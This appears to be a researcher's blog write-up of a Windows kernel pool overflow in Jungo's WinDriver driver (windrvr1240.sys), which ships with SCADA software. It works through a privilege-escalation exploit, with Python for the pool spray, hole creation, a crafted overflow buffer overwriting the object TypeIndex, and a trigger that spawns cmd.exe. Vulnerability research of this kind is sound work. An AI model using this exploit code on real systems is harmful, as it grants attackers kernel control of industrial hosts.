This year at Blackhat, I attended the [Advanced Windows Exploitation (AWE)][awe] class. It's a hands on class teaching Windows exploitation and whilst I'm relatively versed in usermode exploitation, I needed to get up to speed on windows kernel exploitation. If you haven't taken the class, I encourage you too!

TL;DR

I explain a basic kernel pool overflow vulnerability and how you can exploit it by overwriting the TypeIndex after spraying the kernel pool with a mix of kernel objects.

### Introduction

So, after taking the AWE course I really wanted to find and exploit a few kernel vulnerabilities. Whilst I think the [HackSys Extreme Vulnerable Driver (HEVD)][hevd] is a great learning tool, for me, it doesn't work. I have always enjoyed finding and exploiting vulnerabilities in real applications as they present a hurdle that is often not so obvious.

Since that time I took the course, I have been very slowly (methodically, almost insanely) developing a windows kernel device driver fuzzer. Using this private fuzzer (eta wen publik jelbrek?), I found the vulnerability presented in this post. The technique demonstrated for exploitation is nothing new, but it's slight variation allows an attacker to basically exploit any pool size.

### The vulnerability

After testing a few SCADA products, I came across a third party component called "WinDriver". After a short investigation I realized this is [Jungo's DriverWizard WinDriver][windriver]. This product is bundled and shipped in several SCADA applications, often with an old version too.

After installation, it installs a device driver named windrvr1240.sys to the standard windows driver folder. With some basic reverse engineering, I found several ioctl codes that I plugged directly into my fuzzers config file.

{% highlight json %}
{ 
    "ioctls_range":{
        "start": "0x95380000",
        "end": "0x9538ffff"
    }
}
{% endhighlight %}

Then, I enabled special pool using `verifier /volatile /flags 0x1 /adddriver windrvr1240.sys` and run my fuzzer for a little bit. Eventually finding several exploitable vulnerabilities, in particular this one stood out:

That's user controlled data stored in [esi+ecx] and it's writing out-of-bounds of a kernel pool. Nice. On closer inspection, I noticed that this is actually a pool overflow triggered via an inline copy operation at loc_4199D8.

The copy loop actually copies 8 bytes for every iteration (a qword) and overflows a buffer of size 0x460 (0x458 + 0x8 byte header). **The size of copy is directly attacker controlled** from the input buffer (yep you read that right). No integer overflow, no stored in some obscure place, nada. We can see at 0x004199E8 that the size is attacker controlled from the +0x18 offset of the supplied buffer. Too easy!

### Exploitation

Now comes the fun bit. A generic technique that can be used is the object TypeIndex overwrite which has been blogged on numerous occasions (see references) and is at least 6 years old, so I won't go into too much detail. Basically the tl;dr; is that using *any* kernel object, you can overwrite the TypeIndex stored in the _OBJECT_HEADER.

Some common objects that have been used in the past are the Event object (size 0x40) and the IoCompletionReserve object (size 0x60). Typical exploitation goes like this:

1. Spray the pool with an object of size X, filling pages of memory.
2. Make holes in the pages by freeing/releasing adjacent objects, triggering coalescing to match the target chunk size (in our case 0x460).
3. Allocate and overflow the buffer, hopefully landing into a hole, smashing the next object's _OBJECT_HEADER, thus, pwning the TypeIndex.

For example, say if your overflowed buffer is size 0x200, you could allocate a whole bunch of Event objects, free 0x8 of them (0x40 * 0x8 == 0x200) and voilà, you have your hole where you can allocate and overflow. So, assuming that, we need a kernel object that is modulus with our pool size.

The problem is, that doesn't work with some sizes. For example our pool size is 0x460, so if we do:

{% highlight python %}
>>> 0x460 % 0x40
32
>>> 0x460 % 0x60
64
>>>
{% endhighlight %}

We always have a remainder. This means we cannot craft a hole that will neatly fit our chunk, or can we? There are a few ways to solve it. One way was to search for a kernel object that is modulus with our target buffer size. I spent a little time doing this and found two other kernel objects:

{% highlight python %}
# 1
type = "Job"
size = 0x168

windll.kernel32.CreateJobObjectW(None, None)

# 2
type = "Timer"
size = 0xc8

windll.kernel32.CreateWaitableTimerW(None, 0, None)
{% endhighlight %}

However, those sizes were no use as they are not modulus with 0x460. After some time testing/playing around, I relized that we can do this:

{% highlight python %}
>>> 0x460 % 0xa0
0
>>>
{% endhighlight %}

Great! So 0xa0 can be divided evenly into 0x460, but how do we get kernel objects of size 0xa0? Well if we combine the Event and the IoCompletionReserve objects (0x40 + 0x60 = 0xa0) then we can achieve it.

#### The Spray

{% highlight python %}
def we_can_spray():
    """
    Spray the Kernel Pool with IoCompletionReserve and Event Objects. 
    The IoCompletionReserve object is 0x60 and Event object is 0x40 bytes in length.
    These are allocated from the Nonpaged kernel pool.
    """
    handles = []
    IO_COMPLETION_OBJECT = 1
    for i in range(0, 25000):
        handles.append(windll.kernel32.CreateEventA(0,0,0,0))
        hHandle = HANDLE(0)
        handles.append(ntdll.NtAllocateReserveObject(byref(hHandle), 0x0, IO_COMPLETION_OBJECT))

    # could do with some better validation
    if len(handles) > 0:
        return True
    return False
{% endhighlight %}

This function sprays 50,000 objects. 25,000 Event objects and 25,000 IoCompletionReserve objects. This looks quite pretty in windbg:

#### Creating Holes

The 'IoCo' tag is representative of a IoCompletionReserve object and a 'Even' tag is representative of an Event object. Notice that our first chunks offset is 0x60, thats the offset we will start freeing from. So if we free groups of objects, that is, the IoCompletionReserve and the Event our calculation becomes:

{% highlight python %}
>>> "0x%x" % (0x7 * 0xa0)
'0x460'
>>>
{% endhighlight %}

We will end up with the correct size. Let's take a quick look at what it looks like if we free the next 7 IoCompletionReserve object's only.

So we can see we have seperate freed chunks. But we want to coalesce them into a single 0x460 freed chunk. To achieve this, we need to set the `offset` for our chunks to 0x60 (The first pointing to 0xXXXXY060).

{% highlight python %}
            bin = []

            # object sizes
            CreateEvent_size         = 0x40
            IoCompletionReserve_size = 0x60
            combined_size            = CreateEvent_size + IoCompletionReserve_size

            # after the 0x20 chunk hole, the first object will be the IoCompletionReserve object
            offset = IoCompletionReserve_size   
            for i in range(offset, offset + (7 * combined_size), combined_size):
                try:
                    # chunks need to be next to each other for the coalesce to take effect
                    bin.append(khandlesd[obj + i])
                    bin.append(khandlesd[obj + i - IoCompletionReserve_size])
                except KeyError:
                    pass

            # make sure it's contiguously allocated memory
            if len(tuple(bin)) == 14:
                holes.append(tuple(bin))

    # make the holes to fill
    for hole in holes:
        for handle in hole:
            kernel32.CloseHandle(handle)
{% endhighlight %}

Now, when we run the freeing function, we punch holes into the pool and get a freed chunk of our target size.

We can see that the freed chunks have been coalesced and now we have a perfect sized hole. All we need to do is allocate and overwrite.

#### Surviving the Overflow

You may have noticed the null dword in the exploit at offset 0x90 within the buffer.

{% highlight python %}
def alloc_pool_overflow_buffer(base, input_size):
    """
    Craft our special buffer to trigger the overflow.
    """
    print "(+) allocating pool overflow input buffer"
    baseadd   = c_int(base)
    size = c_int(input_size)
    input  = "\x41" * 0x18                     # offset to size
    input += struct.pack("<I", 0x0000008d)     # controlled size (this triggers the overflow)
    input += "\x42" * (0x90-len(input))        # padding to survive bsod
    input += struct.pack("<I", 0x00000000)     # use a NULL dword for sub_4196CA
    input += "\x43" * ((0x460-0x8)-len(input)) # fill our pool buffer
{% endhighlight %}

This is needed to survive the overflow and avoid any further processing. The following code listing is executed directly after the copy loop.

{% highlight text %}

{% endhighlight %}

The important point is that the code will call sub_4196CA. Also note that @eax becomes our buffer +0x90 (0x004199FA). Let's take a look at that function call.

{% highlight text %}

.text:004196CD                 push    ebx

.text:004196DF                 mov     edi, [ebp+arg_0]     ; controlled buffer
.text:004196E2                 xor     edx, edx

.text:004196E7                 mov     [ebp+arg_4], edx
.text:004196EA                 mov     eax, [edi]           ; make sure @eax is null
.text:004196EC                 mov     [ebx], eax           ; the write here is fine
.text:004196EE                 test    eax, eax
.text:004196F0                 jz      loc_4197CB           ; take the jump
{% endhighlight %}

The code gets a dword value from our SystemBuffer at +0x90, writes to our overflowed buffer and then tests it for null. If it's null, we can avoid further processing in this function and return.

{% highlight text %}
.text:004197CB loc_4197CB:                                  ; CODE XREF: sub_4196CA+26
.text:004197CB                 pop     edi
.text:004197CC                 pop     ebx
.text:004197CD                 pop     ebp
.text:004197CE                 retn    8
{% endhighlight %}

If we don't do this, we will likley BSOD when attempting to access non-existant pointers from our buffer within this function (we could probably survive this anyway). 

Now we can return cleanly and trigger the eop without any issues. For the shellcode cleanup, our overflown buffer is stored in @esi, so we can calculate the offset to the TypeIndex and patch it up. Finally, smashing the ObjectCreateInfo with null is fine because the system will just avoid using that pointer.

#### Crafting Our Buffer

Since the loop copies 0x8 bytes on every iteration and since the starting index is 0x1c:

{% highlight python %}
.text:004199D3                 lea     ecx, [ebx+1Ch]       ; index offset for the first write
{% endhighlight %}

We can do our overflow calculation like so. Let's say we want to overflow the buffer by 44 bytes (0x2c). We take the buffer size, subtract the header, subtract the starting index offset, add the amount of bytes we want to overflow and divide it all by 0x8 (due to the qword copy per loop iteration).

(0x460 - 0x8 - 0x1c + 0x2c) / 0x8 = 0x8d

So a size of 0x8d will overflow the buffer by 0x2c or 44 bytes. This smashes the pool header, quota and object header.

{% highlight python %}
    # repair the allocated chunk header...
    input += struct.pack("<I", 0x040c008c)     # _POOL_HEADER
    input += struct.pack("<I", 0xef436f49)     # _POOL_HEADER (PoolTag)
    input += struct.pack("<I", 0x00000000)     # _OBJECT_HEADER_QUOTA_INFO
    input += struct.pack("<I", 0x0000005c)     # _OBJECT_HEADER_QUOTA_INFO
    input += struct.pack("<I", 0x00000000)     # _OBJECT_HEADER_QUOTA_INFO
    input += struct.pack("<I", 0x00000000)     # _OBJECT_HEADER_QUOTA_INFO
    input += struct.pack("<I", 0x00000001)     # _OBJECT_HEADER (PointerCount)
    input += struct.pack("<I", 0x00000001)     # _OBJECT_HEADER (HandleCount)
    input += struct.pack("<I", 0x00000000)     # _OBJECT_HEADER (Lock)
    input += struct.pack("<I", 0x00080000)     # _OBJECT_HEADER (TypeIndex)
    input += struct.pack("<I", 0x00000000)     # _OBJECT_HEADER (ObjectCreateInfo)
{% endhighlight %}

We can see that we set the TypeIndex to 0x00080000 (actually it's the lower word) to null. This means that that the function table will point to 0x0 and conveniently enough, we can map the null page.

{% highlight text %}
kd> dd nt!ObTypeIndexTable L2
82b7dee0  00000000 bad0b0b0
{% endhighlight %}

Note that the second index is 0xbad0b0b0. I get a funny feeling I can use this same technique on x64 as well :->

#### Triggering Code Execution in the Kernel

Well, we survive execution after triggering our overflow, but in order to gain eop we need to set a pointer to 0x00000074 to leverage the OkayToCloseProcedure function pointer.

{% endhighlight %}

So, 0x28 + 0x4c = 0x74, which is the location of where our pointer needs to be. But how is the OkayToCloseProcedure called? Turns out, that this is a registered aexit handler. So to trigger the execution of code, one just needs to free the corrupted IoCompletionReserve. We don't know which handle is associated with the overflown chunk, so we just free them all.

{% highlight python %}
def trigger_lpe():
    """
    This function frees the IoCompletionReserve objects and this triggers the 
    registered aexit, which is our controlled pointer to OkayToCloseProcedure.
    """
    # free the corrupted chunk to trigger OkayToCloseProcedure
    for k, v in khandlesd.iteritems():
        kernel32.CloseHandle(v)
    os.system("cmd.exe")
{% endhighlight %}

Some people ask how long it takes me to develop exploits. Honestly, since the kernel is new to me, it took me a little longer than normal. For vulnerability analysis and exploitation of this bug, it took me 1.5 days (over the weekend) which is relatively slow for an older platform. 

### Conclusion

Any size chunk that is < 0x1000 can be exploited in this manner. As mentioned, this is not a new technique, but merely a variation to an already existing technique that I wouldn't have discovered if I stuck to exploiting HEVD. Having said that, the ability to take a pre-existing vulnerable driver and develop exploitation techniques from it proves to be invaluable.

Kernel pool determinimism is strong, simply because if you randomize more of the kernel, then the operating system takes a performance hit. The balance between security and performance has always been problematic and it isn't always so clear unless you are dealing directly with the kernel.
